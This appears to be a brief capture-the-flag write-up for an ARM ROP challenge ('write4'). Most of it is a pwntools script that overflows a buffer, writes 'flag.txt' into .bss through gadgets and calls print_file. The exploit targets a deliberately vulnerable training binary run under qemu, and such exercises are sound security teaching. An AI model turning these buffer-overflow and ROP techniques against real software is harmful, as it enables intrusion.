![](../img/write4_arm-1782441405136.webp)

![](../img/write4_arm-1782441418110.webp)

there is a print_file function linked in plt that print the file with the address of r0

![](../img/write4_arm-1782441474869.webp)

![](../img/write4_arm-1782441488301.webp)

with some gadgets to manipulate r0, and change the bss, a ROP chain can be built

```
#!/usr/bin/python3
from pwn import *

context.os="linux"
context.log_level="debug"

context.binary=exe=ELF("./write4_armv5-hf")

# p=process(["qemu-arm","-L", "/usr/arm-linux-gnueabihf","-g","1234","./write4_armv5-hf"])
p=process(["qemu-arm","./write4_armv5-hf"])

buffer=0x20*b"A"
pop_r0pc=0x000105f4
str_r3Ir4I_pop_r3r4pc=0x000105ec
pop_r3r4pc=0x000105f0
addr=0x21800

payload=flat(
    buffer,
    0,

    pop_r3r4pc,
    0x6C662F2E,
    addr,
    str_r3Ir4I_pop_r3r4pc,
    0x742E6761,
    addr+4,
    str_r3Ir4I_pop_r3r4pc,
    0x7478,
    addr+8,
    str_r3Ir4I_pop_r3r4pc,
    0,
    0,
    pop_r0pc,
    addr,
    exe.plt["print_file"]
)

p.recvuntil("> ")
p.send(payload)

p.interactive()
```